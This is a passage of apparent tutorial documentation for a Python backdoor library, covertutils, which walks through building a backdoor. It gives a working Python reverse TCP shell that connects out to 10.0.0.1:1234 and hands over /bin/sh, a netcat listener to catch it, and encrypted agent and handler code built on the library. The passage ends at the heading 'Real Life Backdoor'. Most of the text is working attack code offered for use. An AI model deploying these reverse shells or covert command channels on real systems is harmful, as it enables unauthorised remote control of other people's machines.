Assembling a Backdoor **from Scratch** - *The Tutorial*
=======================================================




For Starters - Without `covertutils`
------------------------------------


The simplest possible reverse TCP shell in `Python` is the one below:

Agent
+++++

.. code:: python

	import socket,subprocess,os
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(("10.0.0.1",1234))
	os.dup2(s.fileno(),0)
	os.dup2(s.fileno(),1)
	os.dup2(s.fileno(),2)
	p=subprocess.call(["/bin/sh","-i"]);

Source is the everlasting PentestMonkey_ .

.. _PentestMonkey : http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet


When these commands run on the compromised host a reverse TCP connection spawns towards `10.0.0.1:1234`. The compromised host then maps all input and output of this TCP connection to a process, started by the ``/bin/sh`` binary.

So the other side of the TCP connection directly interacts with the remote process (which happens to be `a shell`).
But I bet that you know all that.



*So this code snippet above is the `Agent`. Moving on...



Handler
+++++++

.. code:: bash

	$ nc -nlvp 1234

The `Handler` just needs to accept the TCP connection. Sending any data through that connection will result into running them in the remote `shell` process.


So, the ingredients of this backdoor are the following:

 - `Agent`: The Python code
 - `Handler` : The ``netcat`` bind listen command
 - `Communication Channel` : TCP connection
 - `Commands` : `plaintext` shell commands and responses come and go


Main Course - With `covertutils`
--------------------------------


Let's remake a reverse TCP shell, but that time using `covertutils`.

Agent
+++++



Orchestration Step
^^^^^^^^^^^^^^^^^^

First we are gonna need an ``Orchestrator`` object. This will password-protect our communication, providing us fixed-size byte arrays. Those bytes can be transmitted in any way, plus recognized amongst random data.
In our case we will send them over through a plain TCP connection.

.. code:: python

	from covertutils.orchestration import SimpleOrchestrator

	orch_obj = SimpleOrchestrator(
		"Our passphrase can be anything! &^&%{}",
		out_length = 20,
		in_length = 20,
		)


Done. Now we are sure that all bytes arrays leaving our side will have a fixed length of 20 bytes (even if we send a plain ``whoami`` command which consists of 6 bytes). This is in case we need to fit them somewhere where a fixed bytelength is needed.

We also have to be sure that every byte array arriving to our side is also of 20 bytes exactly.

Finally, the arrays are encrypto-scrambled using derivatives of our `passphrase`, so they will look gibberish to anyone that doesn't have that `passphrase`.

Communication Channel Step
^^^^^^^^^^^^^^^^^^^^^^^^^^

Then, we have to provide wrappers for the `Communication Channel`. TCP that is. So, making a ``send( data )`` and a ``recv()`` blocking function will be dead simple:

.. code:: python

	import socket
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(("10.0.0.1",1234))

	def send( data ) :
		s.send( data )

	def recv() :
		return s.recv(4096)	# This will automatically block as socket.recv() is a blocking method


All set. Special needs on data that will go through the wire can be coded in those functions!
For example, if we need all data to travel in ``base64``, then we create the ``send( data )`` and ``recv()`` as below:

.. code:: python

	import codecs

	def send( data ) :
		s.send( codecs.encode( data, 'base64') )	# Base64 will travel

	def recv() :
		data = s.recv(4096)
		return codecs.decode( data, 'base64')	# Raw bytes will be finally received


.. note:: This won't affect the ``SimpleOrchestrator``'s byte length assertion of 20 bytes, as the ``recv()`` function decodes the data to the original byte length.


Feature Step
^^^^^^^^^^^^

Now, that `Data Orchestration` and `Communication Channel` are all set, we need to define the features of this backdoor!

So, let's make some cool stuff using the ``BaseHandler`` first !



.. code:: python

	from covertutils.handlers import BaseHandler

	class MyAgent_Handler( BaseHandler ) :
		""" This class tries hard to be self-explanatory """

		def __init__(self, recv, send, orch, **kw) :
			super( MyAgent_Handler, self ).__init__( recv, send, orch, **kw )
			print ( "[!] Agent with Orchestrator ID: '{}' started!".format( orch.getIdentity() ) )
			print()


		def onMessage( self, stream, message ) :
			print ( "[+] Message arrived!" )
			print ( "{} -> {}".format(stream, message) )
			print ("[>] Sending the received message in reverse order!")
			self.preferred_send( message[::-1] )

		def onChunk( self, stream, message ) :
			print ( "[+] Chunk arrived for stream '{}' !".format(stream) )
			if message :
				print ("[*] Message assembled. onMessage() will be called next!")
			print()

		def onNotRecognised(self) :
			print ("[-] Got some Gibberish")
			print ("Initialized the Orchestrator with wrong passphrase?")
			print()


Those methods will be automatically by called by an internal thread (no need to start it manually), so anything written to their bodies will run when circumstances meet.


Putting it all together!
^^^^^^^^^^^^^^^^^^^^^^^^


.. code :: python

	handler_obj = MyAgent_Handler(recv, send, orch_obj)

	from time import sleep

	while True : sleep(10)


**Done!**

Once this script runs, and the ``MyAgent_Handler`` instantiates, it will listen to the TCP connection (`internal thread magic`) and run the ``on*`` methods automatically.

As all backdoor functionality is implemented in those methods, our **Agent is FINISHED!**


With such agent we can't have a simple ``netcat`` handler though... We need something bigger. Let's jump to it...


Handler
+++++++



Orchestration Step
^^^^^^^^^^^^^^^^^^

Same stuff:

.. code:: python

	from covertutils.orchestration import SimpleOrchestrator

	orch_obj = SimpleOrchestrator(
		"Our passphrase can be anything! &^&%{}",
		out_length = 20,
		in_length = 20,
		reverse = True,	# <-------
		)

Just do not forget the ``reverse = True`` argument to create the `complementary` encryption keys and stuff. This is **all internal**, no need to care.


.. warning :: Oh, and passing a different `passphrase` will result in your backdoor not working. I bet you could see that coming!


Pretty straightforward, moving one...


Communication Channel Step
^^^^^^^^^^^^^^^^^^^^^^^^^^

As we have a Reverse TCP connection, our `Handler` must be a TCP listener.

Pure python socket magic ahead:

.. code ::

	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)	# To make the port immediately available after killing - gimmick
	s.bind( addr )
	s.listen(5)

	client, client_addr = s.accept()



And our wrappers:


.. code ::


	def recv () :		# Create wrappers for networking
		return client.recv( 50 )

	def send( raw ) :		# Create wrappers for networking
		return client.send( raw )



Feature Step
^^^^^^^^^^^^

.. code:: python

	from covertutils.handlers import BaseHandler

	class MyHandler_Handler( BaseHandler ) :
		""" This class tries hard to be self-explanatory """

		def __init__(self, recv, send, orch, **kw) :
			super( MyHandler_Handler, self ).__init__( recv, send, orch, **kw )
			print ( "[!] Handler with Orchestrator ID: '{}' started!".format( orch.getIdentity() ) )
			print()


		def onMessage( self, stream, message ) :
			print ( "[+] Message arrived!" )
			print ( "{} -> {}".format(stream, message) )	# <-------
			print ( "[<] Original Message {}".format(message[::-1]) )

		def onChunk( self, stream, message ) :
			print ( "[+] Chunk arrived for stream '{}' !".format(stream) )
			if message :
				print ("[*] Message assembled. onMessage() will be called next!")
			print()

		def onNotRecognised(self) :
			print ("[-] Got some Gibberish")
			print ("Initialized the Orchestrator with wrong passphrase?")
			print()


So the plan is that for `PoC purposes` the `Agent` will read all messages sent to it and respond with their `reversed` form.
The `Handler` though, will display to the user the reversed form of what it received, finally printing the original message.




Putting it all together!
^^^^^^^^^^^^^^^^^^^^^^^^

.. code :: python

	handler_obj = MyHandler_Handler(recv, send, orch_obj)

This time we need to interact with the ``handler_obj`` instance, in order to actually send stuff to our `Agent`.
For that we can use the :meth:`preferred_send` method of the :class:`BaseHandler` class which honors the `Behavior` of the `Handler` object (more on this at :ref:`behaviors`).




.. code :: python


	try: input = raw_input	# Python 2/3 nonsense
	except NameError: pass	# (fuck my life)

	while True :
		inp = input("~~~> ")
		if inp :
			handler_obj.preferred_send( inp )


Here we got a custom shell that gets user input and sends it over.

There is a vastly better way but I leave it for **Dessert**.


Real Life Backdoor - With `covertutils`
---------------------------------------


Here we will use the goodies that are found in the ``impl`` sub-packages to snip away most of the code while actually adding functionality!


Agent
+++++
